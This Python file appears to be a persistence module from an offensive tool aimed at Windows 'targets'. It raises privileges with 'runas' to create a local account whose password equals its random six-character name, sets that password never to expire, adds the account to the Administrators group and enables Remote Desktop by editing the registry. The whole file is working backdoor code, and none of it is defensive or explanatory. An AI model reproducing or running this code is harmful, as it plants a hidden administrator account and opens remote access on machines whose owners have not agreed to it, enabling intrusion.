import win32com.shell.shell as shell
import uuid


def __set_user_account_password_to_never_expire(username):
    command = f"WMIC USERACCOUNT WHERE Name='{username}' SET PasswordExpires=FALSE"
    shell.ShellExecuteEx(lpVerb='runas', lpFile='cmd.exe', lpParameters='/C ' + command)


def create_user_account_on_target():
    username = uuid.uuid4().hex[:6]
    try:
        command = f"net user {username} {username} /add /active:yes"
        shell.ShellExecuteEx(lpVerb='runas', lpFile='cmd.exe', lpParameters='/C ' + command)
        __set_user_account_password_to_never_expire(username)
        return username
    except:
        return None


def add_user_account_to_administrators(username):
    try:
        command = f"net localgroup administrators {username} /add"
        shell.ShellExecuteEx(lpVerb='runas', lpFile='cmd.exe', lpParameters='/C ' + command)
        return True
    except:
        return False


def enable_rdp_on_target():
    command = 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'
    try:
        shell.ShellExecuteEx(lpVerb='runas', lpFile='cmd.exe', lpParameters='/C ' + command)
        return True
    except:
        return False
